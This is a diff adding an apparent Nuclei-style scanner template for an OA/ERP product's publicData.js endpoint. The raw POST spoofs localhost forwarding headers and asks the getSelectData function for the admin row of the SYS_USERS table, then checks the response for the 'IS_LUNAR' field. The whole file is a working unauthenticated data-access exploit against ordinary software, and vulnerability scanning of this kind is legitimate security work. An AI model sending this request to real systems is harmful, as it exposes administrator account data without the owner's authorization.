@@ -1,0 +1,31 @@
+id: fe-publicData-sql
+
+info:
+  name: fe-publicData-sql
+  author: fe-publicData-sql
+
+requests:
+  - raw:
+      - |
+        POST /oaerp/ui/common/publicData.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 CNVD
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        type=getSelectData&table=SYS_USERS&filter=SU01%3D%27admin%27
+
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200 && contains_all(body,'IS_LUNAR')"
+
